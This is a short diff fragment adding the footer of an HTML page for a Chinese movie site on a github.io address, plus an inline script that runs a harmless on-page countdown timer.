+      网站名称：<a href="https://baqifulidianyingwang-wap.github.io/">霸气福利电影网</a> ｜ 网站网址：https://baqifulidianyingwang-wap.github.io/
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var t=11*3600+38*60,d=document;
+  function p(n){return String(n).padStart(2,'0')}
+  function tick(){
+    if(t<0)t=0;
+    var s=Math.floor(t%60),m=Math.floor(t/60%60),h=Math.floor(t/3600%24),dd=Math.floor(t/86400);
+    if(d.getElementById('cd-d'))d.getElementById('cd-d').textContent=p(dd);
+    if(d.getElementById('cd-h'))d.getElementById('cd-h').textContent=p(h);
+    if(d.getElementById('cd-m'))d.getElementById('cd-m').textContent=p(m);
+    if(d.getElementById('cd-s'))d.getElementById('cd-s').textContent=p(s);
+    t--;
+  }
+  tick();setInterval(tick,1000);
+})();
+</script>
+</body>
+</html>
